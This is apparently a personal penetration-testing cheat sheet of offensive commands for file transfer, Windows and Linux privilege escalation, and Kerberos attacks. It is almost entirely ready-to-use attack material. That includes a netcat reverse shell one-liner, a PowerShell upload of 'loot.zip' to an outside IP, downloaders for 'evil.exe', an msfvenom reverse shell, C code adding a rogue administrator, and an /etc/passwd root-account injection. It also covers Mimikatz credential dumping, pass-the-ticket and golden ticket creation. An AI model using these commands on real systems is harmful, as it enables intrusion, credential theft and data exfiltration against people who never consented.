## File Transfers
**Delete yo shit when you done.**

DON'T USE CURL IF YOU CAN HELP IT, TRY CERTUTIL:
`certutil.exe -urlcache -split -f http://[IP]/test.exe`

You can host an FTP server if you really want to...
`pure-ftpd`

OR SMB
`impacket-smbserver SMB . -comment share -ts -debug -smb2support -username user -password 'pass'`

I like hosting a web server personally though.

Here's a fun little ditty to create a .vbs file to download a file from a self hosted web server if no other options exist:

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo  Err.Clear >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo  http.Open "GET", strURL, False >> wget.vbs
echo  http.Send >> wget.vbs
echo  varByteArray = http.ResponseBody >> wget.vbs
echo  Set http = Nothing >> wget.vbs
echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo  strData = "" >> wget.vbs
echo  strBuffer = "" >> wget.vbs
echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo  Next >> wget.vbs
echo  ts.Close >> wget.vbs
```

SAMPLE USAGE:
`cscript wget.vbs http://[IP]/evil.exe evil.exe`

Here is a similar script builder for **powershell**:
`echo $webclient = New-Object System.Net.WebClient >>wget.ps1`
`echo $url = "http://[IP]/evil.exe" >>wget.ps1`
`echo $file = "new-exploit.exe" >>wget.ps1`
`echo $webclient.DownloadFile($url,$file) >>wget.ps1`

YOU MUST RUN THE SCRIPT LIKE SO:
`powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1`

You can also run the powershell command above as a one-liner:
`powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://[IP]/winPEAS.bat, 'winpeas.bat')`

If you wanna be wild, you can use **exe2hex** to convert to a script that recreates the file from hex string via non-interactive methods.  A bit over the top, but probably helps bypass some bullshit.

`powershell.exe (New-Object System.Net.WebClient).UploadFile('C:\Users\Administrator\20220204195540_loot.zip', 'http://10.6.64.57/20220204195540_loot.zip')`
## Upgrading Non-Interactive Shell
Sick of not getting command feedback for shit on netcat?

TIME TO UPGRADE
`python -c 'import pty; pty.spawn("/bin/bash")'`
## PowerView Enumeration
- Enumerate Domain Users
	`Get-NetUser|select cn`

- Enumerate Domain Groups
	`Get-NetGroup -GroupName *admin*`

- Enumerate File Shares
	`Invoke-ShareFinder`

- Enumerate PCs on the domain
	`Get-NetComputer -fulldata | select`
## Privilege Escalation
Once you have a stable shell, then you need to up your privileges to read everything.  There's a lot of methods on this, and they can be OS specific, so we are going to separate them into different nodes.

But to begin with, you should see who you are on the system with the low priv shell.
`whoami`

You might be able to gain insight on the machine's function by checking the hostname.
`hostname`

Checking IP information might give us info on potential as a pivot point.
`ipconfig/ifconfig`
`route print/route`

You can also use `netstat` to get a list of all connections on the machine (might reveal new open ports or something
`netstat -anp`

### Windows Privesc
- LIST OF THINGS WORTH CHECKING:
	- Username and hostname |  `whoami`
	- Group memberships of the current user | `whoami /groups`
	- Existing users and groups | `net user, Get-Localuser, Get-LocalGroup, Get-LocalGroupMember`
	- Operating system, version and architecture | `systeminfo`
	- Network information | `ipconfig /all, route print,netstat -ano`
	- Installed applications | `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
	- Running processes  | `Get-Process`

- SEARCH FOR PASSWORD MANAGER DBs
	`Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`

- SEARCH FOR SENSITIVE XAMMP INFO:
	`Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`

- SEARCH HOME DIR
	`Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`

`whoami /priv`
If you have SEImpersonate, USE JUICYPOTATO!!! NOW!!!
`jp.exe -t * -p c:\users\tony\desktop\1234shell.exe -l 1337 -c {e60687f7-01a1-40aa-86ac-db1cbf673334}`

IF THE WINDOWS BUILD IS TOO RECENT FOR THIS, TRY [PRINT SPOOFER](https://github.com/itm4n/PrintSpoofer)
`PrintSpoofer64.exe -i -c cmd.exe`

SEARCH FOR OPEN PORTS:
GOOD IF SOMETHING IS FIREWALLED OFF
`netstat -nao`

Search for Passwords:
`reg query HKLM /f pass /t REG_SZ /s`
PAY PARTICULAR ATTENTION TO THE ControlSet keys

WINPEAS

MANUAL PRIVESC ENUM!
`net user [username]` can provide a lot of info on different users permissions/group memberships

just running `net user` will show all users on the system.

At some point you may need to rely on kernel exploits, and knowing the machine's OS is useful here:
`systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`

Get a list of running processes:
`tasklist`

Get a list of running services:
`tasklist /SVC Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
NOTE:  You cannot see higher priv processes in windows

Search for unquoted service paths:
`wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`

Use `icacls` to check folder permissions for service exes.

show firewall profile:
`netsh advfirewall show currentprofile`
`netsh advfirewall firewall show rule name=all`

Check scheduled tasks:
`schtasks /query /fo LIST /v`

Enumerate Installed Programs:
`wmic product get name, version, vendor`

Enumerate WIndows Updates:
`wmic qfe get Caption, Description, HotFixID, InstalledOn`

Check for folders/files Everyone can write to:
`Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}`

List drivers:
`driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}`

Check these reg keys:
`reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`
`reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`
 (If either of these are set to 1, you can run any msi with elevated permissions.  Make an MSI and execute it.  There ya go)
 
 **PRIVESC TECHNIQUES FOR WINDOWS**
 
 UAC Bypassing...
 
 Replace a service exe and either restart the service or reboot (shutdown /r /t 0) 
 
 ``` c
	#include <stdlib.h>
	
	int main () 
	{ 
	int i;
	
	i = system ("net user evil Ev!lpass /add");
	i = system ("net localgroup administrators evil /add");
	
	return 0; 
	}
```

Compile the C Program above, and you can use it to create a new admin user.
`-i686-w64-mingw32-gcc adduser.c -o adduser.exe`

DON'T USE `CURL` IF YOU CAN HELP IT, TRY `CERTUTIL`:
`certutil.exe -urlcache -split -f <http://FILE> <OUTPUTFILE>`

Use Mimikatz `lsadump`
Consider searching for source code on weird web apps, see if you can find sections for usernames and passwords, then search on the machine.

[Impersonating Privileges wit Juicy Potato on Medium](https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505)
JUICYPOTATO TOOL IF YOU HAVE *SEIMPERSONATE*
- `\\[IP]\share\JuicyPotato.exe -l 4444 -p shell.bat -t *`
- `msfvenom -p cmd/windows/reverse_powershell LHOST=[IP] LPORT=4444 > shell.bat`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`


In PowerShell, `ls` is an alias for `Get-ChildItem` or `gci`. On Windows, it’s often a good idea to run that with `-force`, kind of like running `ls -a`.

Weeeeeeeeeeeeeeeeeeeeeeeeeeeeird DNS thing if you are a DNS Admin:
`dnscmd.exe /config /serverlevelplugindll \\path\to\dll`

#### Windows XP
Sohvaxus' [Windows XP SP0/SP1 Privilege Escalation to System](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)
### Linux PrivEsc
**RUN THIS FIRST:**
``` python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
LINPEAS
```
- you can use the `id` command to get a better idea of user context.

To enum users on linux, just `cat /etc/passwd`.  Try `/etc/shadow` too.  Probably won't work, but give it a go.

At some point you may need to rely on kernel exploits, and knowing the machine's OS is useful here:
- `uname -a`
- `cat /etc/issue`
- `cat /etc/*-release`

Get a list of processes running on the system:
- `ps axu`

- `watch -n 1 "ps -aux | grep pass"`

Check Scheduled Tasks:

- `grep "CRON" /var/log/syslog`
- `ls -lah /etc/cron*` 
- `cat /etc/crontab` **(THIS IS A BIG ONE, MOST STUFF HERE WILL RUN AS ROOT)**

List installed Programs:
- `dpkg -l`
- `/var/`, `/opt/`, `/usr/local/src` and `/usr/src/` are good directories to dig through as well

Find folders you can write to:
- `find / -writable -type d 2>/dev/null`

List Kernel modules:
- `lsmod`
- `/sbin/modinfo [MODULENAME]`

Check for SUID binaries:
- `find / -perm -u=s -type f 2>/dev/null
- `/usr/sbin/getcap -r / 2>/dev/null`
- [GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

**LINUX PRIVESC TECHNIQUES**
Edit something you have permissions for that is being executed in crontab, and wait.

REVERSE SHELL ONE LINER
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f`

If you can write to `/etc/passwd`, you can set passwords.  If a hash is present in `/etc/passwd`, it takes precedence.
So start by creating a hash with openssl:
- `-openssl passwd evil`
Then you can write your hash to a new superuser account like so:
- `-echo "root2:aX0zVUgkV/mg6:0:0:root:/root:/bin/bash" >> /etc/passwd`

Kernel exploits are a thing...

Consider searching for source code on weird web apps, see if you can find sections for usernames and passwords, then search on the machine.

`rbash` fucking you up?
`-python -c 'import pty; pty.spawn("/bin/bash")'`

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation

Add file to path:
`export PATH="/usr/lib/gcc/i486-linux-gnu/4.6/:$PATH"`

CONSIDER TRYING [DIRTY PIPE](https://raw.githubusercontent.com/febinrev/dirtypipez-exploit/main/dirtypipez.c) PoC ("...hijacks a SUID binary to spawn a root shell")
## Kerberos
You can use **Kerbrute** to enumerate accounts without ever having to exploit a machine:
- `kerbrute userenum --dc [IP] -d CONTROLLER.local /home/kali/Documents/TryHackMe/Labs/Attacking_Kerberos/User.txt`
*Note you will need to add an entry to your `/etc/hosts` file.*

Throw this on the machine and run it to harvest tickets
"[Rubeus](https://github.com/GhostPack/Rubeus) is a C# toolset for raw Kerberos interaction and abuses."
- `Rubeus.exe harvest /interval:30`

Run to get hashes of kerberoastable accounts.  Use **Bloodhound** to see if they are worth anything.
	`rubeus.exe kerberoast`
- If you want to do this remotely:
- PART OF IMPACKET
	`GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip [IP] -request`

AS-REP roastable accounts can also be cracked.
	`Rubeus.exe asreproast`

Then just use `hashcat` to crack the passwords.
- *NOTE YOU MAY NEED TO ADD 23$ TO THE HASH!! PAY ATTENTION TO THE FORMAT!!!*

`Mimikatz` can be used to dump creds, but it can also be used to gain Domain Admin tickets and impersonate them.  Obviously great for privesc.
	`mimikatz.exe`
	`privilege::debug`
IF YOU RUN ABOVE AND DON'T GET 20, YOU CANNOT RUN THIS PROPERLY!!! MUST BE ADMIN ON MACHINE!!!

Export tickets on machine:
	`sekurlsa::tickets /export`

Now we can impersonate the ticket.  Recommend using an admin ticket...duh
	`kerberos::ptt <ticket>`
IF YOU ARE ON A DC, DUMP THE HASHES!!!
	`lsadump::lsa /patch`

You can also create a golden ticket on a DC:
	`lsadump::lsa /inject /name:krbtgt`

	kerberos::golden /user: /domain: /sid: /krbtgt: /id:`

Then you can access any machine in the domain!!!
`misc::cmd`
`\\MACHINE1 cmd.exe`
